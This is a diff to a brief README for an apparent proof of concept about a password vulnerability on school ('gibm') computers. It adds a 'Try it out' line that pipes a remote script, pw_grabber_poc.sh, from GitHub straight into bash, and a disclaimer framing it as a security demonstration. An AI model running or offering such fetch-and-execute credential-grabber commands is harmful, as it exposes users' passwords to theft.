@@ -1,5 +1,10 @@
 # PW Vulnerability
 
+## Try it out
+##### ```curl -sSL https://raw.githubusercontent.com/DanielRamp/SecurityAtGIBMIT/master/pw_grabber_poc.sh | bash```
+
+<br/>
+
 ## Disclaimer
 This is a poc demonstrating why you shouldn't use any important credentials to lock your gibm computer.
 I take NO responsibility for any damage caused by the usage of this script.
